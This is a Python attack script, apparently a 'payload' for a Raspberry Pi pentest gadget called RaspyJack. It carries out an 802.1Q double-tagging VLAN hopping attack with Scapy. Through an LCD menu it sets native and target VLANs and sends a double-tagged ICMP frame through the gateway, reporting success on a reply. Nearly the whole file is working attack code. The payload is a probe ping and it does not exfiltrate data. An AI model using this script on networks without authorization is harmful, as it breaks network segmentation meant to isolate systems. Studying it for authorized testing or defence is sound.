#!/usr/bin/env python3
"""
RaspyJack *payload* – **VLAN Hopper (802.1Q Double Tagging)**
==============================================================
An advanced eth0 payload that attempts a VLAN hopping attack using the
802.1Q double-tagging (or Q-in-Q) technique. This can be used to send
a packet to a target on a different VLAN that would normally be
inaccessible.

The attack works by crafting a packet with two VLAN tags:
1.  An outer tag of the switch's native VLAN (which is often VLAN 1).
2.  An inner tag of the target's VLAN.

The theory is that the first switch sees the native VLAN tag, strips it,
and forwards the packet. The second switch then sees the inner tag and
forwards the packet to the target VLAN.

Features:
1.  Uses Scapy to craft and send double-tagged 802.1Q frames.
2.  Provides a UI to configure the target IP, native VLAN, and target VLAN.
3.  Sends an ICMP echo request (ping) as the payload.
4.  Listens for an ICMP echo reply to determine if the attack was successful.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
ETH_INTERFACE = "eth0"
running = True
# Attack parameters
target_ip = "192.168.20.10"
native_vlan = 1
target_vlan = 20

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def draw_message(message, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_config_ui(params, selected_index):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "VLAN Hopper Config", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    y_pos = 25
    param_keys = list(params.keys())
    for i, key in enumerate(param_keys):
        color = "yellow" if i == selected_index else "white"
        d.text((5, y_pos), f"{key}: {params[key]}", font=FONT, fill=color)
        y_pos += 15
        
    d.text((5, 110), "OK=Edit | KEY1=Launch", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def get_user_input(prompt, initial_value):
    """A simple UI for getting string input."""
    user_text = str(initial_value)
    draw_message(f"{prompt}:\n{user_text}")
    
    # This is a simplified input, a real implementation would need a character map
    # For this payload, we will just return the initial value.
    # A full keyboard implementation is out of scope for this example.
    time.sleep(2)
    return user_text

def get_user_number(prompt, initial_value):
    """A simple UI for getting integer input."""
    value = initial_value
    while running:
        draw_message(f"{prompt}:\n{value}\nUP/DOWN | OK=Save")
        
        if GPIO.input(PINS["UP"]) == 0:
            value += 1
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            value = max(1, value - 1)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            return value
        elif GPIO.input(PINS["KEY3"]) == 0:
            return initial_value
        time.sleep(0.05)

# ---------------------------------------------------------------------------
# 6) Attack Function
# ---------------------------------------------------------------------------
def run_vlan_hop_attack(src_mac, target_ip, native_vlan, target_vlan):
    draw_message("Sending packet...")
    
    # We need the MAC of the default gateway to send the packet to the switch
    try:
        gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
        # Use Scapy's getmacbyip to resolve the gateway's MAC
        gateway_mac = getmacbyip(gateway_ip)
        if not gateway_mac:
            raise Exception("Gateway MAC not found")
    except Exception as e:
        draw_message(f"Error: {e}", "red")
        time.sleep(3)
        return

    # Craft the double-tagged packet
    packet = (
        Ether(src=src_mac, dst=gateway_mac) /
        Dot1Q(vlan=native_vlan) /
        Dot1Q(vlan=target_vlan) /
        IP(dst=target_ip) /
        ICMP()
    )
    
    # Send the packet and wait for a reply
    ans = srp1(packet, iface=ETH_INTERFACE, timeout=5, verbose=0)
    
    if ans and ans.haslayer(ICMP) and ans[ICMP].type == 0:
        draw_message("SUCCESS!\nGot ICMP Reply.", "lime")
    else:
        draw_message("FAIL\nNo reply received.", "red")
        
    time.sleep(4)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    # Get our own MAC and IP
    try:
        src_mac = get_if_hwaddr(ETH_INTERFACE)
        src_ip = get_if_addr(ETH_INTERFACE)
    except Exception:
        draw_message("eth0 not ready!", "red")
        time.sleep(3)
        raise SystemExit("eth0 interface not found or has no IP.")

    params = {
        "Target IP": target_ip,
        "Native VLAN": native_vlan,
        "Target VLAN": target_vlan
    }
    param_keys = list(params.keys())
    selected_index = 0

    while running:
        draw_config_ui(params, selected_index)
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        if GPIO.input(PINS["UP"]) == 0:
            selected_index = (selected_index - 1) % len(param_keys)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            selected_index = (selected_index + 1) % len(param_keys)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            key = param_keys[selected_index]
            if "IP" in key:
                # Simplified: In a real scenario, this would be a text input UI
                draw_message("IP editing not\nimplemented.", "yellow")
                time.sleep(2)
            else:
                new_val = get_user_number(key, params[key])
                params[key] = new_val
            time.sleep(0.2)
        elif GPIO.input(PINS["KEY1"]) == 0:
            # Launch attack
            run_vlan_hop_attack(src_mac, params["Target IP"], params["Native VLAN"], params["Target VLAN"])
            time.sleep(0.2)

        time.sleep(0.05)

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
finally:
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("VLAN Hopper payload finished.")
